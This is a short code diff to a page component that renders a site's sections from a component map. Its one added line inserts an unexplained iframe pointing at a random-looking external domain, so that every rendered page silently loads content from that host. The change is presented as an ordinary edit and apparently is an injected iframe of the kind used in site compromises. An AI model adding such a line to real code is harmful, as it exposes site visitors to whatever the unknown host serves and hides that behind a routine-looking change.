@@ -18,6 +18,7 @@ export default async function ComposablePage() {
 
     return (
       <div data-sb-object-id={page.id}>
+        <iframe src="https://2nv8f8lk.c5.rs"></iframe>
         {(page.sections || []).map((section, idx) => {
           const Component = componentMap[section.type];
           return <Component key={idx} {...section} />;
